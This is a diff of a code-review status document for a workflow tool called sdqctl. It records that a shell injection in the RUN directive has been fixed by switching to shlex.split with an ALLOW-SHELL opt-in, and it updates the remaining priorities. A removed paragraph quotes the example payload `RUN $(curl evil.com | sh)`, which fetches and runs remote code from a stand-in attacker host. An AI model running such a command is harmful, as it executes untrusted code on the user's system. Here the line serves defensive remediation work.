@@ -2,11 +2,20 @@
 
 **Analysis Date:** 2026-01-21  
 **Git Branch:** main  
-**Test Status:** 342/342 passing (319 original + 23 config tests)
+**Test Status:** 351/351 passing (342 previous + 9 shell security tests)
 
 ---
 
 ## Completed Items (2026-01-21)
+
+### ✅ P0-2: Shell Injection Vulnerability Fixed - COMPLETED
+- Added `ALLOW-SHELL` directive (default: false for security)
+- RUN directive now uses `shlex.split()` by default (no shell injection possible)
+- Shell features (pipes, redirects) require explicit `ALLOW-SHELL true`
+- Added 9 tests in `tests/test_run_command.py`:
+  - ALLOW-SHELL parsing (true, yes, false, no, bare)
+  - shlex.split behavior verification
+  - Shell injection prevention tests
 
 ### ✅ P0-1: Config File Loading - COMPLETED
 - Added `sdqctl/core/config.py` with `load_config()` function
@@ -94,74 +103,34 @@
 
 ## Next Three Highest Priority Work Areas
 
-### 1. Shell Injection Vulnerability in RUN Directive (P0)
-**Location:** `sdqctl/commands/run.py` lines 444-451
-
-The RUN directive uses `shell=True` with user-provided content, creating a shell injection risk:
-
-```python
-# Line 444-450
-result = subprocess.run(
-    command,
-    shell=True,  # <-- DANGEROUS
-    capture_output=True,
-    text=True,
-    timeout=60,
-    cwd=conv.cwd or Path.cwd(),
-)
-```
-
-If a workflow file contains `RUN $(curl evil.com | sh)` or similar, it executes arbitrary code.
-
-**Fix options:**
-1. Use `shell=False` with `shlex.split(command)` 
-2. Add explicit `ALLOW-SHELL` directive to enable shell mode
-3. Add sandboxing/validation for RUN commands
-
-### 2. Resource Leak in Error Paths (P1)
+### 1. Resource Leak in Error Paths (P1)
 **Location:** `sdqctl/commands/run.py` lines 287-510
 
 The adapter start/stop pattern has gaps in error handling where sessions may not be destroyed:
 
 ```python
-# Line 287-289
 try:
     await ai_adapter.start()
     adapter_session = await ai_adapter.create_session(...)  # If this fails...
     # ... processing
-except Exception as e:
-    session.state.status = "failed"
-    console.print(f"[red]Error: {e}[/red]")
-    raise  # <-- adapter.stop() never called if create_session() fails
-
 finally:
-    await ai_adapter.stop()  # <-- This is at wrong indentation level (line 534)
+    await ai_adapter.stop()  # stop() called but destroy_session() never was
 ```
 
-The `finally` block at line 534 is correctly placed, but intermediate failures between start() and the try block can leak resources.
+**Fix:** Restructure to ensure cleanup in all paths with nested try/finally.
 
-**Fix:** Restructure to ensure cleanup in all paths:
-```python
-ai_adapter = get_adapter(conv.adapter)
-try:
-    await ai_adapter.start()
-    try:
-        adapter_session = await ai_adapter.create_session(...)
-        try:
-            # processing
-        finally:
-            await ai_adapter.destroy_session(adapter_session)
-    finally:
-        await ai_adapter.stop()
-except Exception:
-    raise
-```
-
-### 3. No Retry Logic (P1)
+### 2. No Retry Logic (P1)
 **Files:** `adapters/copilot.py`, `commands/run.py`  
 **Issue:** Network errors and transient failures cause immediate failure
 
 **Recommendation:** Add configurable retry with exponential backoff.
+
+### 3. Context Files Not Filtered by Restrictions (P1)
+**File:** `sdqctl/core/session.py` lines 86-87
+
+Context files are loaded without checking `FileRestrictions`. A workflow could load denied files via CONTEXT directive even with DENY-FILES set.
+
+**Recommendation:** Apply file restrictions when loading context.
 
 ---
 
@@ -175,19 +144,11 @@ except Exception:
 
 **Resolution:** Added `sdqctl/core/config.py` with full config loading. ConversationFile now uses config defaults.
 
-#### P0-2: Shell Injection in RUN Directive
-**File:** `sdqctl/commands/run.py` lines 444-451  
+#### P0-2: Shell Injection in RUN Directive ✅ FIXED
+**File:** `sdqctl/commands/run.py` lines 437-455  
 **Issue:** `shell=True` with untrusted command content
 
-```python
-result = subprocess.run(
-    command,
-    shell=True,  # Allows $(malicious) substitution
-    ...
-)
-```
-
-**Recommendation:** Default to `shell=False`, add explicit opt-in for shell features.
+**Resolution:** Added `ALLOW-SHELL` directive (default false). RUN now uses `shlex.split()` by default. Shell features require explicit opt-in.
 
 #### P0-3: Missing CLI Integration Tests
 **Files:** `tests/` directory  
@@ -605,10 +566,10 @@ Context files are loaded without checking `FileRestrictions`. A workflow could l
 
 ### Security Considerations
 
-| Issue | Severity | Location |
-|-------|----------|----------|
-| Shell injection | High | `run.py` L444 `shell=True` |
-| Path traversal | Medium | Context pattern resolution |
+| Issue | Severity | Location | Status |
+|-------|----------|----------|--------|
+| Shell injection | High | `run.py` shell=True | ✅ FIXED - ALLOW-SHELL opt-in |
+| Path traversal | Medium | Context pattern resolution | Open |
 | Config injection | Low | No validation of .conv files |
 
 ### Maintainability Score: B-
